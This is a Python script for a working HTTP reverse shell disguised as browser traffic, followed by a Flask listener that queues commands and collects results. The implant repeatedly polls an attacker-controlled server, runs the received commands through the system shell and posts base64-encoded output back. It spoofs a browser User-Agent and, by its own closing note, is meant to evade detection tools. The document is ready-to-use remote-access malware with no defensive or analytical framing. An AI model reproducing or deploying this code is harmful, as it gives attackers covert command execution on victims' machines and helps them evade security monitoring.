#!/usr/bin/env python3
# HTTP REVERSE SHELL - MASQUERADES AS WEB TRAFFIC

import requests
import subprocess
import os
import time
import platform
import base64

class HTTPReverseShell:
    def __init__(self, server_url, interval=3):
        self.server_url = server_url  # Your listener URL (http://your-ip:8080)
        self.interval = interval      # Check-in frequency
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        
    def get_command(self):
        """Poll server for commands via HTTP GET"""
        try:
            response = self.session.get(f"{self.server_url}/poll", timeout=5)
            if response.status_code == 200:
                return response.text.strip()
            return None
        except:
            return None
    
    def post_output(self, output):
        """Send command results via HTTP POST"""
        try:
            encoded = base64.b64encode(output.encode()).decode()
            self.session.post(f"{self.server_url}/result", data=encoded, timeout=5)
        except:
            pass
    
    def execute(self, command):
        if command.startswith('cd '):
            path = command[3:].strip()
            os.chdir(path)
            return f"Changed to: {os.getcwd()}"
        
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result
        except Exception as e:
            return str(e)
    
    def run(self):
        while True:
            cmd = self.get_command()
            if cmd and cmd.lower() != 'none':
                output = self.execute(cmd)
                self.post_output(output)
            time.sleep(self.interval)

if __name__ == "__main__":
    SERVER = "http://192.168.1.100:8080"  # CHANGE THIS
    shell = HTTPReverseShell(SERVER)
    shell.run()



# Listener setup (Python HTTP server with API endpoints):
# python

from flask import Flask, request
app = Flask(__name__)
commands = ["whoami"]  # Queue of commands to send
results = []

@app.route('/poll')
def poll():
    if commands:
        return commands.pop(0)
    return "none"

@app.route('/result', methods=['POST'])
def result():
    data = request.data.decode()
    results.append(data)
    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)

'''VARIANT 1: HTTP-BASED REVERSE SHELL

Change from original: Instead of raw TCP, this disguises traffic as HTTP requests,
 making it look like normal web browsing to detection tools.'''